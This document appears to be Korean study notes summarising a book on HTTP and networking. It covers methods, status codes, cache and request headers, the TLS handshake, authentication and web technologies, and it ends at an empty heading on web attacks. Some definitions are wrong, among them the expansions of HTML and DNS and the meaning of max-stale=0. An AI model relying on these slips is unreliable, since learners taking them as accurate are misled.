# Http-Network-Basic-Summary

우에노 센 저자님의 '그림으로 배우는 Http&amp;Network Basic' 책 요약 내용입니다.

## [1장. 웹과 네트워크의 기본]

- HTTP 프로토콜은 세계 각지에서 지식을 공유하기 위해 생겨났습니다.

- 네트워크는 계층을 나누어 관리하는데, 그 이유는 특정 계층의 사양이 변경되었을 때 모든 프로토콜을 변경하지 않도록 하기 위함입니다.

- 데이터를 전송하기 위해서는 네트워크 각 계층에서 헤더를 붙여 아래 계층으로 전달하는 `캡슐화` 라는 작업을 진행합니다.

- IP통신은 사실 MAC주소를 가지고 통신을 합니다. MAC 주소란 네트워크 카드에 할당된 고유한 주소입니다. MAC주소는 `ARP(Address Resolution Protocol)`에 의해 `IP-to-MAC`으로 변환됩니다.

- TCP는 신뢰성있는 데이터를 전송에 대한 프로토콜입니다. 신뢰를 위해 `3-way handshake`, `흐름제어`, `혼잡제어`와 같은 작업을 수행합니다.

- `DNS(Domain Name Server)`는 도메인(URL)을 IP주소로 변환해주는 서비스를 제공하는 애플리케이션 계층에 속합니다.

- `URL(Uniform Resource Locator)`은 웹 페이지를 표시하기 위해 입력하는 주소를 의미합니다.

- `URI(Uniform Resource Identifier)`는 리소스를 구별하는 식별자가 존재하는 문자열입니다.
  - `ftp://ffp.is.co.za/rfc/rfc1808.txt`
  - `tel:+1-816-555-1212`
  - `news:comp.infosystems.www.servers.unix`
  - `http://www.ietf.org/rfc/rfc23969.txt` (URL)

<hr>

## [2장. HTTP 프로토콜]

- HTTP는 서버와 클라이언트 간의 통신에 대한 약속입니다. 리소스를 요청하는 쪽을 클라이언트, 리소스를 제공하는 쪽을 서버라고 지칭합니다.

- HTTP는 상태를 유지하지 않는 프로토콜입니다. 따라서 `쿠키와 세션`을 이용해 이전에 통신했던 데이터를 기억하는 방식을 사용합니다.

  - 쿠키는 서버가 클라이언트에게 최초로 제공하고, 클라이언트는 이후 리퀘스트를 요청할 때 헤더에 쿠키를 포함하여 함께 전달합니다.

- 서버의 리소스는 리퀘스트 URI로 식별합니다.

- 서버의 동작은 리퀘스트의 `Method` 부분을 통해 결정됩니다.

  - GET : 서버의 리소스를 획득
  - POST : 서버의 리소스에 엔티티를 전달 (리소스의 값을 변경할 수 있습니다.)
  - PUT : 파일을 전송 (HTTP는 안전하지 않음.)
  - HEAD : 메시지 헤더 부분만을 획득
  - DELETE : 파일을 삭제 (HTTP는 안전하지 않음.)
  - CONNECT : 프록시에 터널링을 요구합니다.

- HTTP의 `지속 연결(Persistent Connections)`은 하나의 HTML 문서에 여러 개의 이미지 등이 포함된 경우, 여러 번의 TCP Connection이 발생한다는 단점을 보완하기 위해 만들어졌습니다. 지속연결은 1회의 TCP 커넥션 연결로 리퀘스트와 리스폰스를 여러 번 교환합니다. 이 동작은 HTTP/1.1의 표준 동작으로 채택되었습니다.

- 지속 연결은 `파이프 라인(HTTP Pipelining)` 기능을 제공합니다. 파이프라인은 이전 리퀘스트에 대한 응답을 받지 못했음에도 연속적으로 리퀘스트를 전달할 수 있는 기법을 의미합니다. (TCP Sliding Window)

<hr>

## [3장. HTTP 메세지]

- HTTP 메시지는 크게 `메시지 헤더`와 `메시지 바디` 영역으로 나뉩니다. 이 둘 사이에는 `개행문자(CR+LF)`가 포함되어있어, 개행문자로 두 영역을 구분합니다. (메시지 바디 부분은 리퀘스트에 따라 없을 수도 있습니다.)

- HTTP는 전송할 때에 인코딩을 수행하여 전송 효율을 높일 수 있습니다. 대신 인코딩 작업은 CPU를 사용하기 때문에 리소스의 사용은 높아집니다.

- HTTP는 용량이 큰 파일을 압축해서 보내는 `컨텐츠 코딩(Content Codings)` 기능이 있습니다. 이 기능은 엔티티에 인코딩을 적용하는 기법입니다.

  - 대표적으로는 `gzip(GNU zip)`, `compress(UNIX Standard)` 등이 있습니다.

- HTTP는 사이즈가 큰 파일을 분할해서 전송하는 `청크 전송 코딩(Chunked Transfer Coding)` 기능이 있습니다.

  - 네이버 홈을 들어갔을 때, 이미지 파일을 완전히 받아오지 않아도 브라우저가 화면에 표시될 수 있도록 해줍니다.

- HTTP는 `멀티 파트`에도 대응하고 있어 메시지 바디 내부에 엔티티를 여러 개 포함시켜 전송할 수 있습니다. 주로 이미지나 텍스트 파일 등을 업로드할 때 사용되고 있습니다.

  - 헤더의 Content-Type은 `multipart/form-data` 또는 `multipart/byteranges`를 사용하며, 각 엔티티는 `boundary`라는 값을 경계로 구분짓습니다.

- HTTP는 범위를 지정하여 파일의 일부만을 요청하고, 전송받는 `레인지 리퀘스트(Range Request)` 기능이 있습니다.

  - 이 기법은 대용량의 파일을 다운로드 하다 커넥션이 끊어지는 경우, 중간부터 받을 수 있는 리줌(Resume) 기능을 제공합니다.
  - `Range Request`의 리스폰스는 상태코드 `206 Partial Content`로 응답합니다. 서버가 레인지 리퀘스트를 지원하지 않는 경우에는 `200 OK`로 응답합니다.

- 클라이언트의 언어에 맞춰 컨텐츠를 제공하는 기능을 `콘텐츠 네고시에이션(Content Negotiation)`이라고 부릅니다. 컨텐츠 네고시에이션은 리퀘스트의 `언어`, `문자세트`, `인코딩` 등으로 판단합니다.
  - 서버 구동형 네고시에이션 : 서버 측에서 콘텐츠 네고시에이션을 수행합니다. 주로 리퀘스트의 헤더 정보를 참고.
  - 에이전트 구동형 네고시에이션 : 클라이언트 측에서 수동으로 언어를 선택합니다.
  - 트랜스페이런트(투명한) 네고시에이션 : 서버와 클라이언트 각각 네고시에이션을 수행합니다.

<hr>

## [4장. HTTP 상태 코드]

- 서버는 리퀘스트를 어떻게 처리했는 지에 대한 정보를 상태코드에 담아 전송합니다. 상태코드는 40종류가 넘게 있지만, 자주 사용되는 상태 코드정도 14개 정도만 기억해두면 됩니다.

- 2xx : 성공을 의미하는 상태코드

  - 200 Ok : 정상적으로 처리되었음을 의미합니다.
  - 204 No content : 서버가 요청한 내용을 정상적으로 수행했지만, `response body`에는 데이터가 없습니다.
  - 206 Partial Content : `Range Request`에 대해서 정상적으로 처리되었음을 의미합니다.

- 3xx : 리다이렉트

  - 301 Moved Permanent : 요청한 URI가 다른 URI로 변경되었음을 알리며, 변경된 URI로 redirect 합니다.
  - 302 Found : 요청한 URI가 다른 URI로 **임시** 변경되었음을 알리며, 변경된 URI로 redirect 합니다.
  - 303 See Other : POST 메서드를 처리한 후, 별도의 URI로 GET 시키고 싶을 때 사용합니다.
  - 304 Not Modified : 액세스 권한은 있으나 조건이 안맞음을 의미합니다. 리다이렉트와 관련이 없으며, 리스폰스 바디에는 어떠한 데이터도 포함하지 않습니다.

- 4xx : 클라이언트 에러

  - 400 Bad Request : 리퀘스트가 문법적으로 잘못되었음을 의미합니다.
  - 401 Unauthorized : 송신한 리퀘스트에 HTTP 인증(Basic 인증, Digest 인증)이 필요함을 의미합니다. 이미 1번 리퀘스트가 이뤄진 경우에는 실패했음을 표시합니다.
  - 403 Forbidden : 액세스 권한이 없는 요청하여 요청이 거부되었음을 의미합니다. 이유를 명시하고자 하는 경우, 엔티티 바디에 기재합니다.
  - 404 Not Found : 찾고자하는 리소스가 서버에 존재하지 않음을 의미하빈다. 리퀘스트를 거부하고자 할때도 이 상태코드를 사용할 수 있습니다.

- 5xx : 서버 에러
  - 500 Internal Server Error : 서버에서 리퀘스트를 처리하는 도중에 에러가 발생했음을 의미합니다.
  - 503 Service Unavailable : 서버가 과부하 상태이거나 점검중이므로 리퀘스트를 처리하지 못함을 의미합니다.

<hr>

## [5장. HTTP와 연계하는 웹 서버]

- HTTP/1.1에서는 하나의 HTTP 서버에 여러 개의 웹 사이트를 실행할 수 있습니다. 예를 들어, 웹 호스팅을 제공하고 있는 사업자는 1대의 서버에 여러 고객의 웹 사이트를 넣을 수 있습니다. 이러한 기능을 `가상 호스트(Virtual Host)`라고 부릅니다. HTTP 서버에는 이렇게 가상호스트가 존재할 수 있기 때문에 리퀘스트에 `Host/Domain`을 명확히 하여야 합니다.

- 프록시 서버는 클라이언트와 서버의 중간에 위치하여 클라이언트의 리퀘스트를 서버에 전송하고, 서버로부터 받은 리스폰스를 클라이언트에게 전달하는 기능을 합니다. 프록시 서버는 특정 URI에 대해 액세스를 거부하거나(사내 정보 유출 방지), 액세스 로그 획득 등을 목적으로 사용할 수 있습니다.

- `캐싱 프록시`는 서버의 리소스 캐시를 저장해두고, 클라이언트의 요청이 들어오면 서버에 리퀘스트를 전달하지 않고 캐시를 클라이언트에게 전달하는 서버 입니다. 이렇게 함으로써 오리진 서버의 부하를 줄일 수 있습니다. 클라이언트의 요청이나, 캐시가 오래되었다고 판단되는 경우 프록시 서버는 오리진 서버에 요청해 새로운 리소스를 받아옵니다.

- `게이트웨이`는 다른 서버를 중계하는 서버로, 클라이언트로부터 수신한 리퀘스트에 대한 리소스를 보유한 것처럼 행동합니다. 프록시와 유사하지만, 게이트웨이는 오리진 서버와 HTTP 프로토콜 이외의 통신을 합니다. 클라이언트와 게이트웨이 사이를 암호화하는 등으로 안전하게 접속함으로써 통신의 안전성을 높이는 역할도 합니다.

  - 예를 들어, 데이터베이스에 접속해 SQL 쿼리를 사용해서 데이터를 얻을 때 사용할 수 있습니다.
  - 쇼핑 사이트 등에서 신용카드 결제 시스템 등과 연계할 때 사용할 수도 있습니다.

- `리소스 캐시`는 캐싱 프록시만 가지고 있는 것이 아닙니다. 클라이언트의 브라우저도 `리소스 캐시`를 저장하는데 이를 `임시 파일`이라고 부릅니다. 만약, 브라우저가 유효한 캐시를 가지고 있는 경우 서버에 액세스 하지 않고, 해당 페이지를 로컬 디스크에서 불러옵니다. 만약, 리소스가 오래된 것이라고 판단되는 경우 오리진 서버에 새로운 리소스를 요청합니다.

## [6-1장 HTTP/1.1 일반 헤더 필드]

### Cache-Control

**_캐싱 동작을 지정하는 디렉티브입니다._**

- `Cache-Control : public` : 다른 유저에게도 이 캐시를 전달해도 좋다는 의미입니다.
- `Cache-Control : private` : 다른 유저에게는 이 캐시를 전달하지 못합니다. 특정 유저에게만 캐시가 적용됩니다.
- `Cache-Control : no-cache` : 리퀘스트의 경우에는 캐시된 파일을 받지 않음을 의미하고, 리스폰스의 경우에는 캐시를 저장하지 말라는 의미입니다.
- `Cache-Control : no-store` : 리퀘스트나 리스폰스에 기밀정보가 포함되어있으니, 로컬 스토리지(브라우저 캐시)에 저장하지 말라는 의미입니다.
- `Cache-Control : max-age=604800` : 리스폰스에 사용할 경우, 지정된 시간(초)동안은 `리소스 캐시`를 오리진 서버에 유효성 검사를 하지 않아도 됨을 의미합니다.
- `Cache-Control : min-fresh=60` : 캐시의 유효기간이 앞으로 60초 이상은 유효하다면, `리소스 캐시`를 받아들이겠다는 의미입니다.
- `Cache-Control : max-stale=3600` : 캐시의 유효기간 만료된지 3600초 이내라면, `리소스 캐시`를 받아들이겠다는 의미입니다. 0초를 전달하면 시간과 상관없이 받아들입니다.
- `Cache-Control : only-if-cached` : 캐시가 있는 경우에만 받아들입니다. 로컬 캐시가 없는 경우에는 `504 Gateway Timeout` 상태를 반환합니다.
- `Cache-Control : must-revalidate` : 리스폰스의 캐시가 현재도 유효한지 아닌지의 여부를 오리진 서버에 조회를 요구합니다.
- `Cache-Control : no-transform` : 캐시가 엔티티 바디의 미디어 타입을 변경하지 않도록 지정합니다. 즉, 캐시 서버에 의해 이미지가 압축되거나 하는 것을 방지합니다.

### Connection

**_지속적 접속 관리_** 와 **_hop-by-hop 헤더 필드_** 를 지정하는 디렉티브입니다.

- `Connection : Close` : HTTP/1.1에서는 `지속 연결`이 default로 설정되어있습니다. 연결을 명시적으로 해제하고 싶을 때 리스폰스에 해당 디렉티브를 사용합니다.
- `Keep-Alive: timeout=10, max=500` `Connection : Keep-Alive` : 오래된 버전의 HTTP 지속 연결입니다.

### Date

Date는 **_HTTP 메시지를 생성한 날짜_** 를 나타냅니다.

- `Date : Tue, 03 Jul 2018 04:40:59 GMT`

### Pragma

Pragma는 HTTP/1.1 이전에 `no-cache`를 지정하는 디렉티브였습니다. 이 디렉티브는 사용하지 않아도 되나, HTTP 버전이 오래됐을 가능성이 있다면 HTTP/1.1 Cache-Control 디렉티브와 함께 명시합니다.

- `Cache-Control : no-cache` `Pragma : no-cache` : 오래된 버전에서도 캐싱을 사용하지 않도록 지정합니다.

### Trailer

Trailer 헤더 필드는 **_메시지 바디의 뒤에 기술되어 있는 헤더 필드를 미리 전달_** 할 수 있습니다. 반드시 **_청크 전송 인코딩을 사용하고 있는 경우_** 에만 가능합니다.

- `Trailer : Expires` `(맨밑) Expires : Tue, 28 ...`

### Transfer-Encoding

Transfer-Encoding 헤더 필드는 메시지 바디의 전송 코딩 형식을 지정하는 경우에 사용합니다. HTTP/1.1에는 `chuncked`만 지정이 가능합니다.

- `Transfer-Encoding : chunked`

### Upgrade

Upgrade 헤더 필드는 HTTP 및 다른 프로토콜의 새로운 버전이 통신에 사용되는 경우에 사용합니다.

- `Upgrade:TLS/1.0` `Connection:Upgrade` : 클라이언트와 인접한 서버와 TLS/1.0으로 통신하게 됩니다. 상태 코드는 `101 Switching Protocols` 입니다.

### Via

프록시 혹은 게이트웨이는 자신의 서버 정보를 Via 헤더 필드에 추가한 뒤에 메시지를 전송합니다. `리퀘스트 루프의 회피`, `경로추적` 등에 사용됩니다.

### Warning

리스폰스에 관한 추가 정보를 전달합니다. 기본적으로 **_캐시에 관한 문제의 경고_** 를 유저에 전달합니다.

- `Warning : [경고코드][경고한 호스트:포트번호]"[경고문]"([날짜])`

<hr>

## [6-2장 리퀘스트 헤더 필드]

### Accept

- Accept 헤더 필드는 유저 에이전트가 처리할 수 있는 미디어 타입을 상대적인 우선순위로 명시합니다. 우선순위는 1이 제일 높으며, 우선순위(품질)를 명시하고 싶은 경우에는 `;q=0.8`과 같이 명시합니다. 명시하지 않을 경우에는 1입니다.

- `Accept-Charset:iso-8859-5, unicode-1-1;q=0.8` : iso-8859-5 또는 unicode-1-1로 인코딩해서 보내달라는 의미입니다. 이 필드를 `서버 구동형 네고시에이션`에 사용합니다.
- `Accept-Encoding: gzip, deflate` : gzip 또는 deflate로 압축해서 보내도 괜찮다는 의미입니다.
- `Accept-Language: ko-kr, en-us;q=0.7` : 유저 에이전트가 처리할 수 있는 자연어 세트를 알려줍니다. 서버는 한국어 페이지가 없을 경우 en-us 페이지로 안내합니다.
- `Authorization : Basic dWVub3NlbjpwYXNzd29yZA==` : HTTP 인증과 관련이 있습니다. 추후에 자세히 다룹니다.
- `From: info@hackr.jp` : 유저의 메일을 전달합니다. 무슨 일이 발생하면 메일로 연락이 가능합니다.
- `Host : www.hackr.jp` : Host 헤더 필드는 리퀘스트한 리소스의 인터넷 호스트와 포트번호를 전달합니다. Host 명이 없는 경우 비워서 전송합니다.
- `If-Match: "123456"` : 요청한 리소스의 엔티티태그가 "123456"인 경우에만 리퀘스트를 받아들입니다. 아닌 경우에는 `412 Precondition Failed`를 전달합니다.
- `If-Modified-Since : Thu, 15 Apr 2004 ..` : 리소스가 2004년 4월 15일 이후에 갱신되었다면 리퀘스트를 받아들입니다.
- `If-Range : "123456" Range: byte=5001-10000` : 리소스의 엔티티 태그가 "123456"이면 서버는 요청한 5000 바이트만 전송합니다.
- `Max-Forwards : 10` : hop을 지날 수 있는 개수를 10으로 지정합니다. 필드 값이 0이면 마지막에 리퀘스트를 받은 서버가 리스폰스를 합니다. 따라서 리퀘스트가 왜 실패했는지 상황을 알 수 있습니다.
- `Proxy-Authorization : Basic dGlwOjkpNLAGfFY5` : 클라이언트와 서버의 HTTP 엑세스 인증과 비슷한데 다른 점은 클라이언트와 프록시 사이에 인증이 이루어진다는 것입니다.
- `Range : byte=5001-10000` : 리소스의 일부분만 취득하는 Range request를 할 때 지정범위입니다.
- `Referer : http://www.hackr.jp/index.html` : 현재 보내고 있는 리퀘스트를 어느 웹 페이지에서부터 발행되었는지를 전달합니다. 보안상 바람직하지 않다고 판단되는 경우는 보내지 않아도 됩니다. `Referrer`가 맞는 철자인데, 잘못된 철자를 그대로 사용하고 있습니다.
- `User-Agent:Mozila/5.0(Windows NT 6.1) AppleWebKit/535.19(..)` : 리퀘스트를 생성한 브라우저와 유저 에이전트의 이름 등을 전달하기 위한 필드입니다.

<hr>

## [6-3장 리스폰스 헤더 필드]

- `Accept-Ranges: bytes` : 서버가 리소스의 일부분만 전송하는 것에 동의하면 `bytes` 불가능한 경우에는 `none`을 전달합니다.
- `Age : 600` : Age 헤더 필드는 얼마나 오래 전에 오리진 서버에서 리스폰스가 생성되었는지를 전달합니다.
- `ETag : "sadfsda32fsd"` : ETag 헤더 필드는 엔티티 태그라고도 불리며 일의적으로 리소스를 특정하기 위한 문자열을 전달합니다.
- `Location : http://www.mysite.com/index.html` : 리스폰스를 받은 클라이언트는 해당 URI로 리다이렉트 됩니다. 상태코드 3xx와 함께 사용됩니다.
- `Retry-After : 120` : Retry-After 헤더 필드는 클라이언트가 일정 시간 후에 리퀘스트를 다시 시행해야 하는지를 전달합니다.
- `Server : Apache/2.2.17(Unix)` : 서버에 설치되어 있는 HTTP 서버의 소프트웨어를 전달합니다.
- `Vary: Accept-Langugage` : Vary에 지정되어있는 헤더 필드를 가진 리퀘스트에 대해서만 캐시를 반환할 수 있습니다.

<hr>

## [7장. HTTPS]

### HTTP의 단점

- 평문(암호화되지 않은 메시지)로 HTTP 메시지를 보내기 때문에 `도청`, `위장`, `변조`에 취약합니다.
- `도청`으로부터 클라이언트의 개인정보가 탈취될 수 있습니다.
- 클라이언트를 확인하지 않고, 리퀘스트를 전부 받아들이기 때문에 `DOS 공격`에 취약합니다.
- 통신하고자 하는 웹서버가 `위장`을 한 웹 서버일 가능성이 있습니다.
- 공격자가 클라이언트와 웹 서버의 중간에서 서로의 메시지를 `변조`할 수 있습니다. `(Man-in-the-middle-attack)`

### HTTPS

- HTTPS는 HTTP통신을 하는 소켓 부분을 SSL이나 TLS이라는 프로토콜로 대체한 것입니다.
- HTTPS는 신뢰할 수 있는 제 3기관(CA)에게 `인증서`를 발급받아 클라이언트에게 자신을 인증합니다. 따라서 `위장` 공격에 안전합니다.
- HTTPS는 클라이언트와 서버가 주고받는 메시지를 `암호화`하여 `도청` 공격에 안전합니다.
- HTTPS는 `위장` 공격을 방지하기 때문에 `중간자 공격`에 안전합니다. 허나 `메시지 변조`에 대한 보안을 높이고 싶다면 `MAC(Message Authentication Code)`를 덧붙여 사용할 수 있습니다.

### HTTPS 과정

1. 웹 서버는 자신의 공개키와 개인키를 발급합니다.
2. 웹 서버는 발급한 공개키를 `CA(인증기관)`에게 전달하여 인증서 발급을 요청합니다.
3. CA는 자신의 개인키로 웹 서버의 공개키를 암호화`(디지털서명)`하여 웹 서버에게 전달합니다. `(인증서 발급)`
4. 클라이언트는 TLS 통신을 위해 서버에게 `Client Hello(SSL Version/Cipher Suite)` 메시지를 송신합니다.
5. 서버 또한 자신이 사용할 수 있는 SSL Version과 Cipher Suite를 선택하여 `Server Hello` 메시지를 송신합니다.
6. 서버는 추가적으로 위에서 발급받은 `인증서`를 클라이언트에게 전달합니다.
7. 서버는 `Server Hello Done` 메시지를 송신하여 최초의 SSL 네고시에이션이 끝났음을 통지합니다.
8. 클라이언트는 자신의 브라우저의 CA 리스트에서 `인증서`에 적힌 CA를 찾고, CA 공개키를 확인합니다.
9. 클라이언트는 CA의 공개키로 인증서를 복호화하여 `웹 서버의 공개키를 획득`할 수 있습니다.
10. 클라이언트는 `Client Key Exchange` 메시지를 서버에 전달합니다. 여기에는 `Pre-master secret`이라는 난수가 포함되어 있습니다.
11. 클라이언트는 `Change Cipher Spec` 메시지를 송신합니다. 이 메시지 이후에는 암호키를 사용해서 통신한다는 의미입니다.
12. 클라이언트는 `Finished` 메시지를 송신합니다. 이 메시지는 암호화되어 있습니다.
13. 서버에서도 마찬가지로 `Change Cipher Spec` 메시지를 송신합니다.
14. 서버에서도 `Finished` 메시지를 송신합니다.
15. 서버와 클라이언트의 `Finished` 메시지가 서로 교환이 완료되면 SSL 접속이 확립됩니다.
16. 서버와 클라이언트는 앞서 선택한 `대칭키 암호 스펙`과 `Pre-master secret`에서 생성된 `master secret`으로 암호화 통신을 진행합니다.
17. 접속을 끊었을 때에는 `close_notify 메시지`를 송신하고 그 이후에는 `TCP 4 way handshake`을 통해 연결을 해제합니다.

### TLS의 단점

- TLS는 기존의 TCP 통신보다 접속 과정이 복잡하기 때문에 트래픽이 많아 속도가 느리다는 단점이 있습니다.
- TLS는 모든 메시지를 암호화하여 전송하기 때문에 CPU나 메모리 등의 리소스를 다량으로 소비함으로써 처리 속도가 느려집니다.
- SSL 엑셀레이터는 SSL을 처리하기 위한 전용 하드웨어로 소프트웨어로 SSL을 처리할 때보다 몇 배 빠른 계산을 할 수 있습니다.
- 신뢰할 수 있는 인증기관에서 증명서를 발급하는 비용은 년간 수십만원에 달하는 비용으로 저렴하지 않습니다.

## [8장. 인증]

인증이란, 등록된 본인만이 알고 있는 정보를 가지고 자신을 입증하는 절차입니다.

### BASIC 인증

BASIC 인증은 http/1.0에 구현된 인증 방식으로 안전하지 않습니다. 클라이언트가 인증이 필요한 리소스에 접근하면, 서버는 상태 코드 401로 응답하여 인증을 요구합니다. 클라이언트는 `ID:password`를 `base64`로 인코딩한 후, 서버에 전달합니다.

이 인증 방법은 HTTP 도청에 의해 ID와 Password를 외부에 노출시킬 수 있습니다.

### DIGEST 인증

BASIC 인증의 약점을 보완한 HTTP/1.1 방식의 인증입니다. 이 방식 또한 웹 사이트에서 요구하는 보안 수준에는 미치지 못합니다. BASIC과의 차이점은 서버가 상태 코드 401로 응답하는 것과 함께 `챌린지 코드(nonce)`를 송신한다는 점입니다. 클라이언트는 자신의 `인증 수단(ID:PASSWORD)`에 `nonce`를 추가하여 `리스폰스 코드(response)`를 계산하여 송신합니다.

### SSL 클라이언트 인증

SSL 클라이언트 인증은 클라이언트의 `ID:PASSWORD`가 외부로 유출되어, 타인이 인증하는 것을 막기 위해 사용되는 인증 기법입니다. 흔히 `공인인증서`라고 부르며, 이 기법은 `2-factor 인증`으로 사용됩니다. `2-factor 인증`이란, `SSL 클라이언트 인증`과 본인 확인을 위한 `ID:PASSWORD` 인증, 두 가지를 진행하는 기법입니다. SSL 클라이언트 인증은 클라이언트에게 `공인인증서` 설치에 대한 부담을 지게 한다는 점과 안전하게 운용하기 위해서는 상당한 비용을 져야 한다는 단점이 있습니다.

### 폼 베이스 인증

- 폼 베이스 인증은 HTTP 프로토콜에 정의되어있는 인증은 아니지만, 가장 많이 사용되고 있는 인증 방식입니다. 우리가 흔히 웹 애플리케이션에 자격 정보(Credential)를 송신하여 로그인 하는 인증 방법을 의미합니다.

- HTTP는 보안상 취약하기 때문에 HTTP 폼 화면 표시와 입력 데이터의 송신에는 HTTPS 통신을 이용해야 합니다.
- HTTP 통신은 `stateless` 이기 때문에 `세션ID`를 쿠키로 발급받아, 현재 로그인 상태를 유지할 수 있습니다.
- 서버에서 패스워드 등의 자격 정보를 어떻게 보존해야 하는 지에 대한 기준은 없지만, 보통 `salt`라는 부가정보를 사용해서 해시 알고리즘된 결과 값을 저장합니다.

<hr>

## [9장. HTTP에 기능을 추가한 프로토콜]

HTTP는 웹 서비스의 용도가 다양해짐에 따라 한계가 드러나고 있습니다. 예를 들어, SNS와 같이 갱신된 정보를 실시간으로 화면에 표시해야 하는 경우 HTTP에서는 제대로 처리할 수 없습니다. 그 외에도 HTTP는 `비압축`, `반복되는 헤더`, `Stateless` 등으로 병목현상이 발생합니다.

### Ajax

`Ajax(Asynchronous JavaScript XML)`의 약자로 JavaScript나 DOM 조작 등을 활용하는 방식으로, 웹 페이지의 일부분만 고쳐쓸 수 있는 비동기 통신 방법입니다.

Ajax를 이용해 클라이언트가 특정 동작을 했을 때, 웹 사이트의 일부분을 바꾸는 것은 효율적인 방법입니다. 하지만, Ajax를 이용해 실시간으로 서버에서 정보를 취득하려는 경우에는 대량의 리퀘스트가 발생한다는 문제점이 발생합니다.

### Comet

Comet은 서버 측의 콘텐츠에 갱신이 있을 경우, 리퀘스트를 기다리지 않고 갱신된 리소스를 전달하는 방법입니다. 이 방법이 동작하기 위해서는 `서버의 갱신을 확인하는 리퀘스트`에 바로 응답하지 않고, 리소스에 갱신이 생길 때까지 메시지를 보류해둡니다. 그러다가 리소스가 갱신되었을 때 리스폰스를 반환하는 방식입니다.

이 방법은 실시간으로 정보를 반영하는 데에는 탁월하지만, 커넥션을 유지하는 기간이 길어지기 때문에 CPU와 메모리 낭비가 심각합니다.

### SPDY

SPDY는 TCP/IP의 애플리케이션 계층과 트랜스포트 계층 사이에 새로운 세션 계층을 추가하는 형태로 동작하며, 표준으로 SSL을 이용합니다. **_SPDY는 HTTP의 병목 현상을 해결하는 좋은 기술_** 이지만, 대부분의 웹 사이트의 문제는 HTTP 병목 현상 때문만은 아닙니다.

#### SPDY의 기능

- `다중화 스트림` : 단일 TCP 접속을 통해서 복수의 HTTP 리퀘스트를 무제한으로 처리할 수 있습니다.
- `리퀘스트 우선순위 부여` : 리퀘스트에 우선순위를 할당할 수 있습니다.
- `HTTP 헤더 압축` : 리퀘스트와 리스폰스의 헤더를 압축해 전달합니다.
- `서버 푸시 기능` : 서버에서 클라이언트로 데이터를 푸시하는 기능을 지원합니다.
- `서버 힌트 기능` : 서버가 클라이언트에게 리퀘스트 해야 할 리소스를 제안할 수 있습니다.

### WebSocket

`WebSocket`은 웹 브라우저와 웹 서버를 위한 양방향 통신 규격입니다. 웹 서버와 클라이언트가 한 번 접속을 확립하고 나면 그 뒤의 통신은 서버와 클라이언트 어느 쪽에서도 송신할 수 있습니다.

#### WebSocket 특징

- `서버 푸시 기능` : 서버에서 클라이언트로 데이터를 푸시하는 기능을 제공합니다.
- `통신량의 삭감` : 헤더의 사이즈가 작고, 접속 절차는 1번 뿐입니다.
- `핸드쉐이크` : HTTP Upgrade 헤더 필드를 이용해서 `HTTP to WebSocket`으로 프로토콜을 변경합니다.

### HTTP 2.0

HTTP/2.0은 사용자가 웹을 이용할 때의 체감 속도의 개선을 목표로 하고 있습니다. HTTP 2.0의 토대는 `SPDY`와 `WebSocket`입니다.

### WebDAV

`WebDAV(Web-based Distributed Authoring and Versioning)`는 웹 서버의 콘텐츠에 대해서 직접 파일 복사나 편집 작업 등을 할 수 있는 분산 파일 시스템으로 HTTP/1.1을 확장한 프로토콜로 RFC4918에 정의되어 있습니다.

<hr>

## [10장. 웹 콘텐츠 기술들]

### HTML

- HTML은 `Hypertext Transfer Markup Langauge`의 약자로, Hypertext를 전송하기 위한 Markup Langauge란 뜻입니다.

- `Hypertext`는 문서인데, 이미지 파일, 링크 등을 포함하는 문서입니다.
- `Markup Langauge`란 문서의 일부에 특별한 문자열을 붙여 문서를 수식하는 언어란 뜻입니다. ex) `<h1>Hi</h1>`

### CSS

- CSS는 `Cascading Style Sheet`의 약자로 HTML이 브라우저에서 보이는 외관을 바꿀 수 있습니다.
- **구조와 디자인을 분리한다는 이념**으로 만들어졌습니다.

### Dynamic HTML

- 동적 HTML은 정적인 HTML 내용을 클라이언트 사이드 스크립트(JavaScript)를 사용해서 동적으로 변경하는 기술을 말합니다.

- 클릭하면 펼쳐지는 메뉴, 구글 맵스 등

### HTML을 조작하기 쉽게 해주는 DOM

- `DOM(Document Object Model)`은 HTML 문서와 XML 문서를 위한 API(Application Programming Interface)입니다.

```js
<script type="text/javascript">
  var content = document.getElementsByTagName("p"); content[2].style.color =
  "#FF0000";
</script>
```

### CGI

- `CGI(Common Gateway Interface)`는 웹 서버가 클라이언트에게서 받은 리퀘스트를 프로그램에 전달하기 위한 구조입니다. ex) Perl, PHP, Ruby, C언어 등

### Servlet

- `서블릿(Servlet)`은 서버 상의 HTML 등의 동적 콘텐츠를 생성하기 위한 프로그램을 가리킵니다.

- CGI는 리퀘스트마다 프로그램을 기동하기 때문에 대량의 액세스가 있을 때 웹 서버에 부하가 걸리게 되지만 서블릿에서는 웹 서버와 같은 프로세스에서 동작하기 때문에 비교적 부하를 적게 하여 동작시킬 수 있습니다.

### XML

`XML(eXensive Markup Langauge)`라는 것은 목적에 맞게 확장 가능한 범용적으로 사용할 수 있는 마크업 언어라는 뜻입니다.

- XML은 데이터를 기술하고 공유하기 위한 목적으로 만들어졌습니다.

- XML 구조는 태그로 나뉘어져 있고 트리 구조로 되어있기 때문에 XML 구조를 해석하고 요소를 뽑아내는 파서 기능에 의해서 데이터를 쉽게 추출할 수 있습니다.

### RSS/ATOM

- RSS와 Atom은 뉴스나 블로그의 기사 등의 갱신 정보를 송신하기 위한 문서 포맷의 총칭으로 둘 다 XML을 사용하고 있습니다.

### JSON

- `JSON(JavaScript Object Notation)`이라는 것은 정량 데이터 기술 언어로서 JavaScript(ECMAScript)에 있어서 오브젝트 표기법을 바탕으로 하고 있습니다.

- JSON 데이터는 단순하고 가볍게, 게다가 문자열을 JavaScript에서 간단하게 읽어올 수 있다는 점에서 당초 XML이 사용되던 Ajax에서 JSON을 널리 사용하게 되었습니다.

```json
{ "name": "Web Application Security", "num": "TR001" }
```

<br><hr>

## [11장. 웹 공격 기술]

현재 인터넷에서 벌어지는 공격 대부분은 웹 사이트를 노린 것입니다. 웹 사이트는 인증이나 세션 관리 기능을 설계하고 구현하는데, 이 방식이 개발자마다 다양하기 때문에 공격에 취약할 수 있습니다. 또, HTTP 프로토콜은 보안상 안전하지 않고, 쉽게 변조가 가능하기 때문에 해킹이 쉽게 일어날 수 있습니다. 따라서 어떤 웹 사이트 공격 기술이 있는지 살펴봅니다.

### 출력 값의 이스케이프 미비로 인한 취약성

